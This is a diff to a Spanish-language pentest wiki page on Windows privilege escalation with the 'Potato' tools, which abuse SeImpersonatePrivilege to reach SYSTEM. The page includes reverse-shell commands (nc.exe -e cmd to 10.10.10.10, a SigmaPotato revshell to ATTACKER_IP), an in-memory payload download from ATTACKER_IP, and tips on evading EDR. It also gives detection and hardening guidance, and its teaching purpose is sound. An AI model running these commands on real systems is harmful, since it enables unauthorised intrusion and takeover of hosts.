@@ -3,10 +3,10 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 > [!WARNING]
-> **JuicyPotato no funciona** en Windows Server 2019 y Windows 10 build 1809 en adelante. Sin embargo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** pueden usarse para **aprovechar los mismos privilegios y obtener acceso a nivel `NT AUTHORITY\SYSTEM`**. Este [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) profundiza en la herramienta `PrintSpoofer`, que puede usarse para abusar de impersonation privileges en hosts Windows 10 y Server 2019 donde JuicyPotato ya no funciona.
+> **JuicyPotato no funciona** en Windows Server 2019 y Windows 10 build 1809 en adelante. Sin embargo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** pueden usarse para **obtener los mismos privilegios y conseguir acceso a nivel `NT AUTHORITY\SYSTEM`**. Esta [entrada del blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) profundiza en la herramienta `PrintSpoofer`, que puede usarse para abusar de los privilegios de impersonation en hosts Windows 10 y Server 2019 donde JuicyPotato ya no funciona.
 
 > [!TIP]
-> Una alternativa moderna, frecuentemente mantenida en 2024–2025, es SigmaPotato (un fork de GodPotato) que añade in-memory/.NET reflection usage y soporte extendido de OS. Consulta el uso rápido más abajo y el repo en References.
+> Una alternativa moderna mantenida frecuentemente en 2024–2025 es SigmaPotato (un fork de GodPotato) que añade uso en memoria/.NET reflection y soporte de SO extendido. Ver uso rápido abajo y el repo en Referencias.
 
 Related pages for background and manual techniques:
 
@@ -22,23 +22,24 @@ from-high-integrity-to-system-with-name-pipes.md
 privilege-escalation-abusing-tokens.md
 {{#endref}}
 
-## Requisitos y advertencias comunes
+## Requisitos y consideraciones comunes
 
-All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:
+Todas las siguientes técnicas dependen de abusar de un servicio privilegiado capaz de impersonation desde un contexto que tenga cualquiera de los siguientes privilegios:
 
-- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
-- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)
+- SeImpersonatePrivilege (el más común) o SeAssignPrimaryTokenPrivilege
+- No se requiere alta integridad si el token ya tiene SeImpersonatePrivilege (típico para muchas cuentas de servicio como IIS AppPool, MSSQL, etc.)
 
-Check privileges quickly:
+Comprueba los privilegios rápidamente:
 ```cmd
 whoami /priv | findstr /i impersonate
 ```
 Notas operativas:
 
-- PrintSpoofer necesita que el servicio Print Spooler esté en ejecución y accesible a través del endpoint RPC local (spoolss). En entornos reforzados donde Spooler está deshabilitado tras PrintNightmare, prefiera RoguePotato/GodPotato/DCOMPotato/EfsPotato.
-- RoguePotato requiere un resolvedor OXID accesible en TCP/135. Si el egress está bloqueado, use un redirector/port-forwarder (ver ejemplo abajo). Las versiones antiguas necesitaban la opción -f.
-- EfsPotato/SharpEfsPotato abusan de MS-EFSR; si una pipe está bloqueada, pruebe pipes alternativas (lsarpc, efsrpc, samr, lsass, netlogon).
-- El error 0x6d3 durante RpcBindingSetAuthInfo típicamente indica un servicio de autenticación RPC desconocido/no soportado; pruebe una pipe/transport diferente o asegúrese de que el servicio objetivo esté en ejecución.
+- Si tu shell se ejecuta bajo un token restringido que carece de SeImpersonatePrivilege (común para Local Service/Network Service en algunos contextos), restaura los privilegios predeterminados de la cuenta usando FullPowers, luego ejecuta un Potato. Ejemplo: `FullPowers.exe -c "cmd /c whoami /priv" -z`
+- PrintSpoofer necesita que el servicio Print Spooler esté en ejecución y accesible a través del endpoint RPC local (spoolss). En entornos endurecidos donde Spooler está deshabilitado tras PrintNightmare, prefiere RoguePotato/GodPotato/DCOMPotato/EfsPotato.
+- RoguePotato requiere un OXID resolver accesible en TCP/135. Si egress está bloqueado, usa un redirector/port-forwarder (ver ejemplo abajo). Las builds antiguas necesitaban el -f flag.
+- EfsPotato/SharpEfsPotato abusan de MS-EFSR; si un pipe está bloqueado, prueba pipes alternativos (lsarpc, efsrpc, samr, lsass, netlogon).
+- El error 0x6d3 durante RpcBindingSetAuthInfo normalmente indica un servicio de autenticación RPC desconocido/no soportado; prueba con otro pipe/transporte o asegura que el servicio objetivo esté en ejecución.
 
 ## Demostración rápida
 
@@ -59,7 +60,7 @@ NULL
 ```
 Notas:
 - Puedes usar -i para spawn un proceso interactivo en la consola actual, o -c para ejecutar un one-liner.
-- Requiere el servicio Spooler. Si está deshabilitado, esto fallará.
+- Requiere Spooler service. Si está deshabilitado, esto fallará.
 
 ### RoguePotato
 ```bash
@@ -67,7 +68,7 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l
 # In some old versions you need to use the "-f" param
 c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
 ```
-Si el puerto 135 saliente está bloqueado, pivot the OXID resolver via socat en tu redirector:
+Si el puerto saliente 135 está bloqueado, pivot the OXID resolver a través de socat en tu redirector:
 ```bash
 # On attacker redirector (must listen on TCP/135 and forward to victim:9999)
 socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
@@ -111,7 +112,7 @@ CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes su
 
 nt authority\system
 ```
-Consejo: Si un pipe falla o EDR lo bloquea, prueba los otros pipes compatibles:
+Consejo: Si un pipe falla o EDR lo bloquea, intenta con los otros pipes compatibles:
 ```text
 EfsPotato <cmd> [pipe]
 pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
@@ -129,7 +130,7 @@ Notas:
 
 ![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)
 
-DCOMPotato proporciona dos variantes que apuntan a objetos DCOM de servicio que por defecto usan RPC_C_IMP_LEVEL_IMPERSONATE. Compila o usa los binaries proporcionados y ejecute su comando:
+DCOMPotato proporciona dos variantes dirigidas a objetos DCOM de servicio que por defecto usan RPC_C_IMP_LEVEL_IMPERSONATE. Compila o usa los binaries proporcionados y ejecuta tu comando:
 ```cmd
 # PrinterNotify variant
 PrinterNotifyPotato.exe "cmd /c whoami"
@@ -139,7 +140,7 @@ McpManagementPotato.exe "cmd /c whoami"
 ```
 ### SigmaPotato (fork actualizado de GodPotato)
 
-SigmaPotato añade mejoras modernas, como in-memory execution vía .NET reflection y un PowerShell reverse shell helper.
+SigmaPotato añade mejoras modernas como ejecución en memoria mediante .NET reflection y un PowerShell reverse shell helper.
 ```powershell
 # Load and execute from memory (no disk touch)
 [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
@@ -148,15 +149,15 @@ SigmaPotato añade mejoras modernas, como in-memory execution vía .NET reflecti
 # Or ask it to spawn a PS reverse shell
 [SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
 ```
-## Notas de detección y endurecimiento
+## Notas de detección y hardening
 
-- Supervisar procesos que crean named pipes y que llamen inmediatamente a APIs de duplicación de token seguidas de CreateProcessAsUser/CreateProcessWithTokenW. Sysmon puede mostrar telemetría útil: Event ID 1 (process creation), 17/18 (named pipe created/connected), y líneas de comando que lanzan procesos hijos como SYSTEM.
-- Endurecimiento del Spooler: Deshabilitar el servicio Print Spooler en servidores donde no se necesite evita coerciones locales al estilo PrintSpoofer vía spoolss.
-- Endurecimiento de cuentas de servicio: Minimizar la asignación de SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege a servicios personalizados. Considerar ejecutar servicios bajo cuentas virtuales con los mínimos privilegios requeridos y aislarlos con service SID y tokens con escritura restringida cuando sea posible.
+- Monitorizar procesos que creen named pipes y que llamen inmediatamente a las token-duplication APIs seguidas de CreateProcessAsUser/CreateProcessWithTokenW. Sysmon puede mostrar telemetría útil: Event ID 1 (creación de procesos), 17/18 (named pipe creado/conectado) y líneas de comando que lancen procesos hijo como SYSTEM.
+- Endurecimiento del Spooler: Deshabilitar el servicio Print Spooler en servidores donde no se necesita evita coerciones locales al estilo PrintSpoofer a través de spoolss.
+- Endurecimiento de cuentas de servicio: Minimizar la asignación de SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege a servicios personalizados. Considerar ejecutar servicios bajo cuentas virtuales con los privilegios mínimos requeridos e aislarlos con service SID y tokens con permiso de escritura restringido cuando sea posible.
 - Controles de red: Bloquear TCP/135 saliente o restringir el tráfico del RPC endpoint mapper puede romper RoguePotato a menos que haya un redirector interno disponible.
-- EDR/AV: Todas estas herramientas están ampliamente firmadas. Recompilar desde la fuente, renombrar símbolos/strings, o usar ejecución en memoria puede reducir la detección pero no derrotará detecciones comportamentales sólidas.
+- EDR/AV: Todas estas herramientas tienen firmas ampliamente reconocidas. Recompilar desde el código fuente, renombrar símbolos/strings o usar ejecución in-memory puede reducir la detección pero no derrotará detecciones comportamentales robustas.
 
-## Referencias
+## References
 
 - [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
 - [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
@@ -167,5 +168,7 @@ SigmaPotato añade mejoras modernas, como in-memory execution vía .NET reflecti
 - [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
 - [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
 - [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
+- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
+- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
 
 {{#include ../../banners/hacktricks-training.md}}
